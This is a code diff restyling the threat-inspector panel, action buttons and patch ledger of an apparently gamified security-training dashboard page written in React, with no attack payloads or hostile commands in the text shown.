-                  <div>
+                  <div
+                    style={{ display: "flex", alignItems: "center", gap: 6 }}
+                  >
+                    <div
+                      style={{
+                        width: 6,
+                        height: 6,
+                        borderRadius: "50%",
+                        background: sev.dot,
+                        flexShrink: 0,
+                      }}
+                    />
                     <span
                       style={{
-                        fontSize: 9,
+                        fontSize: 10,
                         fontWeight: 700,
-                        letterSpacing: "0.05em",
-                        padding: "3px 7px",
-                        borderRadius: 3,
-                        display: "inline-block",
+                        letterSpacing: "0.06em",
                         color: sev.color,
-                        background: sev.bg,
-                        border: `1px solid ${sev.border}`,
                       }}
                     >
                       {sev.label}
                     </span>
                   </div>
-                  <span
-                    style={{ fontSize: 11, color: "rgba(255,255,255,0.6)" }}
-                  >
-                    {TYPE_LABELS[log.type]}
-                  </span>
+                  <div>
+                    <span
+                      style={{
+                        fontSize: 10,
+                        fontWeight: 700,
+                        letterSpacing: "0.06em",
+                        padding: "2px 7px",
+                        borderRadius: 4,
+                        color: tc.text,
+                        background: tc.bg,
+                        border: `1px solid ${tc.border}`,
+                      }}
+                    >
+                      {TYPE_LABELS[log.type]}
+                    </span>
+                  </div>
                   <div
                     style={{
                       fontSize: 12,
-                      color: "rgba(255,255,255,0.38)",
+                      color: "#6b6b70",
                       whiteSpace: "nowrap",
                       overflow: "hidden",
                       textOverflow: "ellipsis",
-                      paddingRight: 14,
+                      paddingRight: 16,
                     }}
                   >
                     <span
                       style={{
                         color: sev.color,
-                        marginRight: 7,
                         fontWeight: 700,
+                        marginRight: 7,
                       }}
                     >
                       {log.user}
@@ -1760,9 +1808,8 @@ export default function DefensePage() {
                   <div
                     style={{
                       display: "flex",
-                      gap: 3,
+                      gap: 5,
                       justifyContent: "flex-end",
-                      flexWrap: "wrap",
                     }}
                   >
                     {isGP && (
@@ -1770,14 +1817,15 @@ export default function DefensePage() {
                         style={{
                           fontSize: 9,
                           fontWeight: 700,
-                          padding: "2px 5px",
-                          borderRadius: 3,
-                          color: "#34D399",
-                          background: "rgba(52,211,153,0.12)",
-                          border: "1px solid rgba(52,211,153,0.3)",
+                          padding: "2px 7px",
+                          borderRadius: 4,
+                          color: "#4ade80",
+                          background: "rgba(74,222,128,0.1)",
+                          border: "1px solid rgba(74,222,128,0.2)",
+                          letterSpacing: "0.06em",
                         }}
                       >
-                        PATCHED
+                        FIXED
                       </span>
                     )}
                     {!isGP && log.detected && (
@@ -1785,44 +1833,15 @@ export default function DefensePage() {
                         style={{
                           fontSize: 9,
                           fontWeight: 700,
-                          padding: "2px 5px",
-                          borderRadius: 3,
-                          color: "#38BDF8",
-                          background: "rgba(56,189,248,0.12)",
-                          border: "1px solid rgba(56,189,248,0.3)",
+                          padding: "2px 7px",
+                          borderRadius: 4,
+                          color: "#38bdf8",
+                          background: "rgba(56,189,248,0.08)",
+                          border: "1px solid rgba(56,189,248,0.2)",
+                          letterSpacing: "0.06em",
                         }}
                       >
                         ACK
-                      </span>
-                    )}
-                    {!isGP && log.blocked && (
-                      <span
-                        style={{
-                          fontSize: 9,
-                          fontWeight: 700,
-                          padding: "2px 5px",
-                          borderRadius: 3,
-                          color: "#F87171",
-                          background: "rgba(248,113,113,0.12)",
-                          border: "1px solid rgba(248,113,113,0.3)",
-                        }}
-                      >
-                        BLK
-                      </span>
-                    )}
-                    {!isGP && log.restored && (
-                      <span
-                        style={{
-                          fontSize: 9,
-                          fontWeight: 700,
-                          padding: "2px 5px",
-                          borderRadius: 3,
-                          color: "#A78BFA",
-                          background: "rgba(167,139,250,0.12)",
-                          border: "1px solid rgba(167,139,250,0.3)",
-                        }}
-                      >
-                        RST
                       </span>
                     )}
                   </div>
@@ -1832,38 +1851,54 @@ export default function DefensePage() {
           </div>
         </div>
 
-        {/* RIGHT: Inspector + Ledger */}
+        {/* ── RIGHT: INSPECTOR ── */}
         <div
           style={{
-            width: 400,
+            width: 420,
             flexShrink: 0,
             display: "flex",
             flexDirection: "column",
-            background: "rgba(0,0,0,0.22)",
+            background: "#111115",
+            borderLeft: "1px solid #1e1e24",
           }}
         >
+          {/* Inspector header */}
           <div
-            style={{ padding: "11px 18px", borderBottom: bdr, flexShrink: 0 }}
+            style={{
+              padding: "14px 22px",
+              borderBottom: "1px solid #1e1e24",
+              flexShrink: 0,
+              display: "flex",
+              alignItems: "center",
+              justifyContent: "space-between",
+            }}
           >
             <span
               style={{
                 fontSize: 10,
                 fontWeight: 700,
-                letterSpacing: "0.1em",
-                color: "rgba(255,255,255,0.35)",
+                letterSpacing: "0.12em",
+                color: "#3a3a42",
               }}
             >
               THREAT INSPECTOR
             </span>
+            {selectedLog && (
+              <span
+                style={{ fontSize: 10, color: "#4a4a52", fontFamily: mono }}
+              >
+                #{selectedLog.id}
+              </span>
+            )}
           </div>
 
+          {/* Inspector body */}
           <div
             style={{
-              padding: "14px 18px",
-              borderBottom: bdr,
+              flex: 1,
               overflowY: "auto",
-              maxHeight: "65vh",
-              flexShrink: 0,
+              display: "flex",
+              flexDirection: "column",
             }}
           >
             {!selectedLog ? (
@@ -1873,141 +1908,576 @@ export default function DefensePage() {
                   flexDirection: "column",
                   alignItems: "center",
                   justifyContent: "center",
-                  height: 200,
-                  color: "rgba(255,255,255,0.18)",
-                  fontSize: 11,
-                  gap: 10,
-                  letterSpacing: "0.05em",
+                  flex: 1,
+                  gap: 12,
+                  color: "#2a2a30",
                   textAlign: "center",
+                  padding: 32,
                 }}
               >
-                <div style={{ fontSize: 40, opacity: 0.1 }}>⛊</div>
-                AWAITING THREAT SELECTION
-                <div style={{ fontSize: 10, color: "rgba(255,255,255,0.1)" }}>
-                  Click any row to inspect
+                <svg
+                  width="40"
+                  height="40"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  style={{ opacity: 0.3 }}
+                >
+                  <path
+                    d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"
+                    stroke="#e8e6e1"
+                    strokeWidth="1.5"
+                    strokeLinecap="round"
+                    strokeLinejoin="round"
+                  />
+                  <circle
+                    cx="12"
+                    cy="12"
+                    r="2"
+                    stroke="#e8e6e1"
+                    strokeWidth="1.5"
+                  />
+                </svg>
+                <div
+                  style={{
+                    fontSize: 11,
+                    fontWeight: 700,
+                    letterSpacing: "0.1em",
+                    color: "#2a2a30",
+                  }}
+                >
+                  SELECT A THREAT
+                </div>
+                <div style={{ fontSize: 11, color: "#2a2a30" }}>
+                  Click any log row to inspect
                 </div>
               </div>
             ) : (
               (() => {
                 const sev = SEV_CONFIG[selectedLog.severity];
+                const tc = TYPE_COLORS[selectedLog.type];
                 const isGP = patchedTypes.has(selectedLog.type);
+                const canAck = !selectedLog.detected && !isGP;
+                const canPatch = selectedLog.detected && !isGP;
+
                 return (
-                  <div>
-                    {/* Banner */}
+                  <div
+                    style={{
+                      padding: "20px 22px",
+                      display: "flex",
+                      flexDirection: "column",
+                      gap: 16,
+                    }}
+                  >
+                    {/* Threat card */}
                     <div
                       style={{
-                        background: sev.bg,
-                        border: `1px solid ${sev.border}`,
-                        borderRadius: 8,
-                        padding: 14,
-                        marginBottom: 12,
-                        boxShadow: `0 4px 20px ${sev.glow}`,
+                        background: "#16161a",
+                        border: `1px solid ${sev.dot}22`,
+                        borderRadius: 10,
+                        overflow: "hidden",
                       }}
                     >
+                      {/* Card top accent */}
+                      <div
+                        style={{
+                          height: 3,
+                          background: `linear-gradient(90deg, ${sev.dot}, transparent)`,
+                        }}
+                      />
+                      <div style={{ padding: "16px 18px" }}>
+                        <div
+                          style={{
+                            display: "flex",
+                            alignItems: "center",
+                            justifyContent: "space-between",
+                            marginBottom: 10,
+                          }}
+                        >
+                          <span
+                            style={{
+                              fontSize: 10,
+                              fontWeight: 700,
+                              letterSpacing: "0.08em",
+                              padding: "2px 8px",
+                              borderRadius: 4,
+                              color: tc.text,
+                              background: tc.bg,
+                              border: `1px solid ${tc.border}`,
+                            }}
+                          >
+                            {TYPE_LABELS[selectedLog.type]}
+                          </span>
+                          <div
+                            style={{
+                              display: "flex",
+                              alignItems: "center",
+                              gap: 5,
+                            }}
+                          >
+                            <div
+                              style={{
+                                width: 6,
+                                height: 6,
+                                borderRadius: "50%",
+                                background: sev.dot,
+                              }}
+                            />
+                            <span
+                              style={{
+                                fontSize: 10,
+                                fontWeight: 700,
+                                color: sev.color,
+                                letterSpacing: "0.06em",
+                              }}
+                            >
+                              {sev.label}
+                            </span>
+                          </div>
+                        </div>
+                        <div
+                          style={{
+                            fontSize: 16,
+                            fontWeight: 800,
+                            color: sev.color,
+                            marginBottom: 6,
+                            letterSpacing: "-0.01em",
+                          }}
+                        >
+                          {selectedLog.user}
+                        </div>
+                        <div
+                          style={{
+                            fontSize: 12,
+                            color: "#8b8480",
+                            lineHeight: 1.65,
+                            marginBottom: 14,
+                          }}
+                        >
+                          {selectedLog.detail}
+                        </div>
+
+                        {/* Meta grid */}
+                        <div
+                          style={{
+                            display: "grid",
+                            gridTemplateColumns: "1fr 1fr",
+                            gap: 8,
+                            background: "#0d0d10",
+                            borderRadius: 7,
+                            padding: 12,
+                            marginBottom: 12,
+                          }}
+                        >
+                          {[
+                            ["SOURCE IP", selectedLog.ip],
+                            ["COUNTRY", selectedLog.country],
+                            ["ENDPOINT", selectedLog.endpoint],
+                            ["METHOD", selectedLog.method],
+                            ["PORT", String(selectedLog.port)],
+                            ["STATUS", String(selectedLog.statusCode)],
+                          ].map(([l, v]) => (
+                            <div key={l}>
+                              <div
+                                style={{
+                                  fontSize: 9,
+                                  color: "#3a3a42",
+                                  fontWeight: 700,
+                                  letterSpacing: "0.08em",
+                                  marginBottom: 3,
+                                }}
+                              >
+                                {l}
+                              </div>
+                              <div
+                                style={{
+                                  fontSize: 11,
+                                  color: "#a0998f",
+                                  wordBreak: "break-all",
+                                  fontFamily: l === "SOURCE IP" ? mono : sans,
+                                }}
+                              >
+                                {v}
+                              </div>
+                            </div>
+                          ))}
+                        </div>
+
+                        <div
+                          style={{
+                            fontSize: 9,
+                            color: "#3a3a42",
+                            fontWeight: 700,
+                            letterSpacing: "0.08em",
+                            marginBottom: 5,
+                          }}
+                        >
+                          RAW PAYLOAD
+                        </div>
+                        <div
+                          style={{
+                            background: "#0d0d10",
+                            border: "1px solid #1e1e24",
+                            borderRadius: 6,
+                            padding: "10px 12px",
+                            fontSize: 11,
+                            color: "#6b6b70",
+                            whiteSpace: "pre-wrap",
+                            wordBreak: "break-all",
+                            lineHeight: 1.7,
+                            fontFamily: mono,
+                            maxHeight: 90,
+                            overflowY: "auto",
+                          }}
+                        >
+                          {selectedLog.payload}
+                        </div>
+                      </div>
+                    </div>
+
+                    {/* Action area */}
+                    {isGP ? (
+                      <div
+                        style={{
+                          padding: "14px 16px",
+                          background: "rgba(74,222,128,0.06)",
+                          border: "1px solid rgba(74,222,128,0.18)",
+                          borderRadius: 8,
+                          display: "flex",
+                          alignItems: "center",
+                          gap: 10,
+                        }}
+                      >
+                        <div
+                          style={{
+                            width: 20,
+                            height: 20,
+                            background: "rgba(74,222,128,0.15)",
+                            borderRadius: "50%",
+                            display: "flex",
+                            alignItems: "center",
+                            justifyContent: "center",
+                            flexShrink: 0,
+                          }}
+                        >
+                          <span style={{ fontSize: 10, color: "#4ade80" }}>
+                            ✓
+                          </span>
+                        </div>
+                        <div>
+                          <div
+                            style={{
+                              fontSize: 12,
+                              fontWeight: 700,
+                              color: "#4ade80",
+                              marginBottom: 2,
+                            }}
+                          >
+                            Vulnerability Patched
+                          </div>
+                          <div style={{ fontSize: 11, color: "#4a6a52" }}>
+                            {TYPE_LABELS[selectedLog.type]} is globally closed.
+                          </div>
+                        </div>
+                      </div>
+                    ) : (
                       <div
                         style={{
                           display: "flex",
-                          justifyContent: "space-between",
-                          alignItems: "center",
-                          marginBottom: 6,
-                        }}
-                      >
-                        <span
-                          style={{
-                            color: sev.color,
-                            fontWeight: 700,
-                            fontSize: 11,
-                            letterSpacing: "0.06em",
-                          }}
-                        >
-                          {TYPE_LABELS[selectedLog.type]}
-                        </span>
-                        <span
-                          style={{
-                            fontSize: 9,
-                            fontWeight: 700,
-                            padding: "3px 8px",
-                            borderRadius: 3,
-                            border: `1px solid ${sev.border}`,
-                            color: sev.color,
-                            background: "rgba(0,0,0,0.3)",
-                          }}
-                        >
-                          {sev.label}
-                        </span>
-                      </div>
-                      <div
-                        style={{
-                          fontSize: 13,
-                          fontWeight: 700,
-                          color: sev.color,
-                          marginBottom: 5,
-                        }}
-                      >
-                        {selectedLog.user}
-                      </div>
-                      <div
-                        style={{
-                          fontSize: 12,
-                          lineHeight: 1.6,
-                          color: "#f1f5f9",
-                          marginBottom: 12,
-                        }}
-                      >
-                        {selectedLog.detail}
-                      </div>
-                      <div
-                        style={{
-                          display: "grid",
-                          gridTemplateColumns: "1fr 1fr",
+                          flexDirection: "column",
                           gap: 8,
-                          background: "rgba(0,0,0,0.25)",
-                          padding: 10,
-                          borderRadius: 6,
-                          marginBottom: 10,
                         }}
                       >
-                        {[
-                          ["SOURCE IP", selectedLog.ip],
-                          ["COUNTRY", selectedLog.country],
-                          ["PORT", String(selectedLog.port)],
-                          ["ENDPOINT", selectedLog.endpoint],
-                          ["METHOD", selectedLog.method],
-                          ["STATUS", String(selectedLog.statusCode)],
-                          ["EVENT ID", selectedLog.id],
-                          ["TIME", fmtMs(selectedLog.ts)],
-                        ].map(([l, v]) => (
-                          <div key={l}>
+                        {/* Step indicator */}
+                        <div
+                          style={{
+                            display: "flex",
+                            alignItems: "center",
+                            gap: 0,
+                            marginBottom: 4,
+                          }}
+                        >
+                          <div
+                            style={{
+                              display: "flex",
+                              alignItems: "center",
+                              gap: 6,
+                            }}
+                          >
                             <div
                               style={{
-                                fontSize: 9,
-                                color: "rgba(255,255,255,0.28)",
+                                width: 20,
+                                height: 20,
+                                borderRadius: "50%",
+                                background: selectedLog.detected
+                                  ? "rgba(74,222,128,0.15)"
+                                  : "rgba(56,189,248,0.15)",
+                                border: `1px solid ${selectedLog.detected ? "rgba(74,222,128,0.3)" : "rgba(56,189,248,0.3)"}`,
+                                display: "flex",
+                                alignItems: "center",
+                                justifyContent: "center",
+                                fontSize: 10,
                                 fontWeight: 700,
-                                letterSpacing: "0.08em",
-                                marginBottom: 3,
+                                color: selectedLog.detected
+                                  ? "#4ade80"
+                                  : "#38bdf8",
                               }}
                             >
-                              {l}
+                              {selectedLog.detected ? "✓" : "1"}
                             </div>
-                            <div
+                            <span
                               style={{
                                 fontSize: 10,
-                                color: "#e2e8f0",
-                                wordBreak: "break-all",
+                                fontWeight: 700,
+                                color: selectedLog.detected
+                                  ? "#4ade80"
+                                  : "#38bdf8",
+                                letterSpacing: "0.06em",
                               }}
                             >
-                              {v}
+                              ACKNOWLEDGE
+                            </span>
+                          </div>
+                          <div
+                            style={{
+                              flex: 1,
+                              height: 1,
+                              background: selectedLog.detected
+                                ? "rgba(74,222,128,0.2)"
+                                : "#1e1e24",
+                              margin: "0 10px",
+                            }}
+                          />
+                          <div
+                            style={{
+                              display: "flex",
+                              alignItems: "center",
+                              gap: 6,
+                            }}
+                          >
+                            <div
+                              style={{
+                                width: 20,
+                                height: 20,
+                                borderRadius: "50%",
+                                background: canPatch
+                                  ? "rgba(74,222,128,0.15)"
+                                  : "#1e1e24",
+                                border: `1px solid ${canPatch ? "rgba(74,222,128,0.3)" : "#2a2a30"}`,
+                                display: "flex",
+                                alignItems: "center",
+                                justifyContent: "center",
+                                fontSize: 10,
+                                fontWeight: 700,
+                                color: canPatch ? "#4ade80" : "#3a3a42",
+                              }}
+                            >
+                              2
+                            </div>
+                            <span
+                              style={{
+                                fontSize: 10,
+                                fontWeight: 700,
+                                color: canPatch ? "#4ade80" : "#3a3a42",
+                                letterSpacing: "0.06em",
+                              }}
+                            >
+                              DEPLOY HOTFIX
+                            </span>
+                          </div>
+                        </div>
+
+                        {/* Acknowledge button */}
+                        <button
+                          onClick={() => acknowledge(selectedLog.id)}
+                          disabled={!canAck}
+                          style={{
+                            fontFamily: sans,
+                            width: "100%",
+                            padding: "12px 16px",
+                            borderRadius: 8,
+                            fontSize: 12,
+                            fontWeight: 700,
+                            letterSpacing: "0.04em",
+                            cursor: canAck ? "pointer" : "not-allowed",
+                            border: "1px solid",
+                            transition: "all 0.15s",
+                            display: "flex",
+                            alignItems: "center",
+                            justifyContent: "space-between",
+                            ...(selectedLog.detected
+                              ? {
+                                  background: "rgba(74,222,128,0.05)",
+                                  borderColor: "rgba(74,222,128,0.15)",
+                                  color: "#4a6a52",
+                                }
+                              : {
+                                  background: "rgba(56,189,248,0.08)",
+                                  borderColor: "rgba(56,189,248,0.25)",
+                                  color: "#38bdf8",
+                                }),
+                          }}
+                        >
+                          <div
+                            style={{
+                              display: "flex",
+                              alignItems: "center",
+                              gap: 8,
+                            }}
+                          >
+                            <span style={{ fontSize: 14 }}>
+                              {selectedLog.detected ? "✓" : "◉"}
+                            </span>
+                            <div style={{ textAlign: "left" }}>
+                              <div>
+                                {selectedLog.detected
+                                  ? "Acknowledged"
+                                  : "Acknowledge Threat"}
+                              </div>
+                              <div
+                                style={{
+                                  fontSize: 10,
+                                  fontWeight: 400,
+                                  color: selectedLog.detected
+                                    ? "#3a5a42"
+                                    : "#1a6080",
+                                  marginTop: 1,
+                                }}
+                              >
+                                {selectedLog.detected
+                                  ? "Step 1 complete — proceed to hotfix"
+                                  : "Mark as triaged to unlock hotfix"}
+                              </div>
                             </div>
                           </div>
-                        ))}
+                          {!selectedLog.detected && (
+                            <span
+                              style={{
+                                fontSize: 10,
+                                color: "#1a6080",
+                                background: "rgba(56,189,248,0.08)",
+                                padding: "2px 7px",
+                                borderRadius: 4,
+                              }}
+                            >
+                              No pts
+                            </span>
+                          )}
+                        </button>
+
+                        {/* Deploy Hotfix button */}
+                        <button
+                          onClick={() => openPatch(selectedLog.id)}
+                          disabled={!canPatch}
+                          style={{
+                            fontFamily: sans,
+                            width: "100%",
+                            padding: "13px 16px",
+                            borderRadius: 8,
+                            fontSize: 12,
+                            fontWeight: 700,
+                            letterSpacing: "0.04em",
+                            cursor: canPatch ? "pointer" : "not-allowed",
+                            border: "1px solid",
+                            transition: "all 0.15s",
+                            display: "flex",
+                            alignItems: "center",
+                            justifyContent: "space-between",
+                            ...(canPatch
+                              ? {
+                                  background: "rgba(74,222,128,0.1)",
+                                  borderColor: "rgba(74,222,128,0.3)",
+                                  color: "#4ade80",
+                                }
+                              : {
+                                  background: "#0d0d10",
+                                  borderColor: "#1e1e24",
+                                  color: "#3a3a42",
+                                }),
+                          }}
+                        >
+                          <div
+                            style={{
+                              display: "flex",
+                              alignItems: "center",
+                              gap: 8,
+                            }}
+                          >
+                            <span style={{ fontSize: 14 }}>
+                              {canPatch ? "⚡" : "⟳"}
+                            </span>
+                            <div style={{ textAlign: "left" }}>
+                              <div>
+                                {canPatch ? "Deploy Hotfix" : "Deploy Hotfix"}
+                              </div>
+                              <div
+                                style={{
+                                  fontSize: 10,
+                                  fontWeight: 400,
+                                  color: canPatch ? "#15803d" : "#2a2a30",
+                                  marginTop: 1,
+                                }}
+                              >
+                                {canPatch
+                                  ? "Opens code editor — fix the vulnerability"
+                                  : "Acknowledge threat first"}
+                              </div>
+                            </div>
+                          </div>
+                          {canPatch && (
+                            <div style={{ textAlign: "right" }}>
+                              <span
+                                style={{
+                                  fontSize: 13,
+                                  fontWeight: 800,
+                                  color: "#4ade80",
+                                }}
+                              >
+                                +{CHALLENGES[selectedLog.type]?.points || 0}
+                              </span>
+                              <div style={{ fontSize: 9, color: "#15803d" }}>
+                                pts
+                              </div>
+                            </div>
+                          )}
+                        </button>
                       </div>
+                    )}
+
+                    {/* Toast */}
+                    {toast && (
+                      <div
+                        style={{
+                          padding: "10px 14px",
+                          borderRadius: 7,
+                          fontSize: 12,
+                          fontWeight: 600,
+                          animation: "fadeup 0.2s ease",
+                          ...(toast.ok
+                            ? {
+                                background: "rgba(74,222,128,0.08)",
+                                border: "1px solid rgba(74,222,128,0.2)",
+                                color: "#4ade80",
+                              }
+                            : {
+                                background: "rgba(239,68,68,0.08)",
+                                border: "1px solid rgba(239,68,68,0.2)",
+                                color: "#f87171",
+                              }),
+                        }}
+                      >
+                        {toast.msg}
+                      </div>
+                    )}
+
+                    {/* User agent */}
+                    <div>
                       <div
                         style={{
                           fontSize: 9,
-                          color: "rgba(255,255,255,0.28)",
+                          color: "#2a2a30",
                           fontWeight: 700,
-                          letterSpacing: "0.08em",
-                          marginBottom: 3,
+                          letterSpacing: "0.1em",
+                          marginBottom: 5,
                         }}
                       >
                         USER AGENT
@@ -2015,288 +2485,135 @@ export default function DefensePage() {
                       <div
                         style={{
                           fontSize: 10,
-                          color: "rgba(255,255,255,0.38)",
-                          marginBottom: 10,
+                          color: "#4a4a52",
+                          fontFamily: mono,
+                          lineHeight: 1.6,
+                          wordBreak: "break-all",
                         }}
                       >
                         {selectedLog.userAgent}
                       </div>
-                      <div
-                        style={{
-                          fontSize: 9,
-                          color: "rgba(255,255,255,0.28)",
-                          fontWeight: 700,
-                          letterSpacing: "0.08em",
-                          marginBottom: 4,
-                        }}
-                      >
-                        RAW PAYLOAD
-                      </div>
-                      <div
-                        style={{
-                          background: "rgba(0,0,0,0.4)",
-                          border: "1px solid rgba(255,255,255,0.07)",
-                          borderRadius: 5,
-                          padding: 8,
-                          fontSize: 10,
-                          color: "#7dd3fc",
-                          whiteSpace: "pre-wrap",
-                          wordBreak: "break-all",
-                          lineHeight: 1.55,
-                        }}
-                      >
-                        {selectedLog.payload}
-                      </div>
                     </div>
-
-                    {isGP ? (
-                      <div
-                        style={{
-                          padding: "10px 14px",
-                          background: "rgba(52,211,153,0.07)",
-                          border: "1px solid rgba(52,211,153,0.2)",
-                          borderRadius: 6,
-                          fontSize: 11,
-                          color: "#34D399",
-                          marginBottom: 10,
-                        }}
-                      >
-                        ✓ {TYPE_LABELS[selectedLog.type]} globally patched —
-                        this vector is closed.
-                      </div>
-                    ) : (
-                      <div
-                        style={{
-                          display: "grid",
-                          gridTemplateColumns: "1fr 1fr",
-                          gap: 8,
-                          marginBottom: 10,
-                        }}
-                      >
-                        {(
-                          Object.entries(ACTION_CONFIG) as [
-                            DefenseAction,
-                            (typeof ACTION_CONFIG)[DefenseAction],
-                          ][]
-                        ).map(([action, cfg]) => {
-                          const isDone =
-                            (action === "detect" && selectedLog.detected) ||
-                            (action === "patch" && selectedLog.patched) ||
-                            (action === "block" && selectedLog.blocked) ||
-                            (action === "restore" && selectedLog.restored);
-                          const notReady =
-                            action === "patch" && !selectedLog.detected;
-                          const disabled = isDone || notReady;
-                          const isPatch = action === "patch";
-                          return (
-                            <button
-                              key={action}
-                              onClick={() => doAction(action)}
-                              style={{
-                                fontFamily: mono,
-                                background: isDone
-                                  ? "rgba(0,0,0,0.2)"
-                                  : isPatch
-                                    ? "rgba(52,211,153,0.06)"
-                                    : "rgba(255,255,255,0.02)",
-                                border: `1px solid ${isDone ? "rgba(255,255,255,0.06)" : isPatch ? "rgba(52,211,153,0.3)" : "rgba(255,255,255,0.1)"}`,
-                                borderRadius: 6,
-                                padding: "11px 12px",
-                                display: "flex",
-                                justifyContent: "space-between",
-                                alignItems: "center",
-                                cursor: disabled ? "not-allowed" : "pointer",
-                                opacity: disabled ? 0.3 : 1,
-                                color: "#e2e8f0",
-                                transition: "all 0.15s",
-                              }}
-                            >
-                              <div>
-                                <div
-                                  style={{
-                                    fontSize: 11,
-                                    fontWeight: 700,
-                                    letterSpacing: "0.02em",
-                                    marginBottom: 2,
-                                    color: isDone
-                                      ? "rgba(255,255,255,0.3)"
-                                      : isPatch
-                                        ? "#34D399"
-                                        : "#e2e8f0",
-                                  }}
-                                >
-                                  {cfg.label}
-                                </div>
-                                <div
-                                  style={{
-                                    fontSize: 9,
-                                    color: "rgba(255,255,255,0.25)",
-                                  }}
-                                >
-                                  {isDone
-                                    ? "✓ done"
-                                    : notReady
-                                      ? "⟳ ack first"
-                                      : isPatch
-                                        ? "opens editor →"
-                                        : cfg.desc.substring(0, 20)}
-                                </div>
-                              </div>
-                              <div
-                                style={{
-                                  fontSize: 12,
-                                  fontWeight: 700,
-                                  color: isDone
-                                    ? "rgba(255,255,255,0.2)"
-                                    : cfg.color,
-                                  marginLeft: 8,
-                                  flexShrink: 0,
-                                }}
-                              >
-                                +{cfg.points}
-                              </div>
-                            </button>
-                          );
-                        })}
-                      </div>
-                    )}
-
-                    {toast && (
-                      <div
-                        style={{
-                          padding: "9px 12px",
-                          borderRadius: 5,
-                          fontSize: 11,
-                          fontWeight: 700,
-                          ...(toast.type === "ok"
-                            ? {
-                                background: "rgba(52,211,153,0.1)",
-                                border: "1px solid rgba(52,211,153,0.3)",
-                                color: "#34D399",
-                              }
-                            : {
-                                background: "rgba(248,113,113,0.1)",
-                                border: "1px solid rgba(248,113,113,0.3)",
-                                color: "#F87171",
-                              }),
-                        }}
-                      >
-                        {toast.msg}
-                      </div>
-                    )}
                   </div>
                 );
               })()
             )}
           </div>
 
-          {/* Ledger */}
-          <div
-            style={{
-              padding: "11px 18px",
-              borderBottom: bdr,
-              flexShrink: 0,
-              display: "flex",
-              justifyContent: "space-between",
-            }}
-          >
-            <span
+          {/* Score ledger at bottom */}
+          <div style={{ borderTop: "1px solid #1e1e24", flexShrink: 0 }}>
+            <div
               style={{
-                fontSize: 10,
-                fontWeight: 700,
-                letterSpacing: "0.1em",
-                color: "rgba(255,255,255,0.35)",
+                padding: "11px 22px",
+                display: "flex",
+                justifyContent: "space-between",
+                alignItems: "center",
+                background: "#0d0d10",
               }}
             >
-              RESPONSE LEDGER
-            </span>
-            <span style={{ fontSize: 10, color: "rgba(255,255,255,0.2)" }}>
-              {scoreHistory.length} actions
-            </span>
-          </div>
-          <div style={{ flex: 1, overflowY: "auto", padding: "12px 18px" }}>
-            {scoreHistory.length === 0 ? (
-              <div
+              <span
                 style={{
-                  color: "rgba(255,255,255,0.18)",
                   fontSize: 10,
-                  letterSpacing: "0.06em",
-                  textAlign: "center",
-                  marginTop: 20,
+                  fontWeight: 700,
+                  letterSpacing: "0.1em",
+                  color: "#3a3a42",
                 }}
               >
-                No actions recorded yet
-              </div>
-            ) : (
-              scoreHistory.map((h, i) => {
-                const cfg = ACTION_CONFIG[h.action];
-                return (
-                  <div
-                    key={i}
-                    style={{
-                      display: "flex",
-                      justifyContent: "space-between",
-                      alignItems: "center",
-                      padding: "9px 0",
-                      borderBottom: "1px solid rgba(255,255,255,0.04)",
-                    }}
-                  >
-                    <div>
-                      <div
-                        style={{
-                          color: cfg.color,
-                          fontWeight: 700,
-                          fontSize: 10,
-                          letterSpacing: "0.05em",
-                          marginBottom: 3,
-                        }}
-                      >
-                        {cfg.label.toUpperCase()}
-                      </div>
-                      <div
-                        style={{
-                          color: "rgba(255,255,255,0.28)",
-                          fontSize: 10,
-                        }}
-                      >
-                        {h.detail}
-                      </div>
-                      <div
-                        style={{
-                          color: "rgba(255,255,255,0.15)",
-                          fontSize: 9,
-                          marginTop: 2,
-                        }}
-                      >
-                        {fmt(h.ts)}
-                      </div>
-                    </div>
+                PATCH LEDGER
+              </span>
+              <span style={{ fontSize: 10, color: "#2a2a30" }}>
+                {scoreHistory.length} fixes
+              </span>
+            </div>
+            <div style={{ maxHeight: 180, overflowY: "auto" }}>
+              {scoreHistory.length === 0 ? (
+                <div
+                  style={{
+                    padding: "16px 22px",
+                    color: "#2a2a30",
+                    fontSize: 11,
+                    textAlign: "center",
+                  }}
+                >
+                  No patches deployed yet
+                </div>
+              ) : (
+                scoreHistory.map((h, i) => {
+                  const tc = TYPE_COLORS[h.type];
+                  return (
                     <div
+                      key={i}
                       style={{
-                        color: "#34D399",
-                        fontWeight: 700,
-                        fontSize: 13,
-                        flexShrink: 0,
-                        marginLeft: 8,
+                        display: "flex",
+                        justifyContent: "space-between",
+                        alignItems: "center",
+                        padding: "10px 22px",
+                        borderBottom: "1px solid #16161a",
                       }}
                     >
-                      +{h.points}
+                      <div style={{ flex: 1, minWidth: 0 }}>
+                        <div
+                          style={{
+                            fontSize: 10,
+                            fontWeight: 700,
+                            color: tc.text,
+                            letterSpacing: "0.06em",
+                            marginBottom: 2,
+                          }}
+                        >
+                          {TYPE_LABELS[h.type]}
+                        </div>
+                        <div
+                          style={{
+                            fontSize: 11,
+                            color: "#4a4a52",
+                            whiteSpace: "nowrap",
+                            overflow: "hidden",
+                            textOverflow: "ellipsis",
+                          }}
+                        >
+                          {h.detail}
+                        </div>
+                        <div
+                          style={{
+                            fontSize: 10,
+                            color: "#3a3a42",
+                            marginTop: 2,
+                            fontFamily: mono,
+                          }}
+                        >
+                          {fmt(h.ts)}
+                        </div>
+                      </div>
+                      <div
+                        style={{
+                          fontSize: 16,
+                          fontWeight: 800,
+                          color: "#4ade80",
+                          marginLeft: 12,
+                          letterSpacing: "-0.02em",
+                          fontFamily: mono,
+                        }}
+                      >
+                        +{h.points}
+                      </div>
                     </div>
-                  </div>
-                );
-              })
-            )}
+                  );
+                })
+              )}
+            </div>
           </div>
         </div>
       </div>
 
       <style jsx global>{`
-        @import url("https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap");
+        @import url("https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap");
         * {
           box-sizing: border-box;
         }
         body {
           margin: 0;
+          background: #0f0f11;
         }
         @keyframes pulse {
           0%,
@@ -2305,16 +2622,26 @@ export default function DefensePage() {
             transform: scale(1);
           }
           50% {
-            opacity: 0.4;
-            transform: scale(0.75);
+            opacity: 0.5;
+            transform: scale(0.8);
           }
         }
-        @keyframes flash {
+        @keyframes redflash {
           0% {
             opacity: 1;
           }
           100% {
             opacity: 0;
+          }
+        }
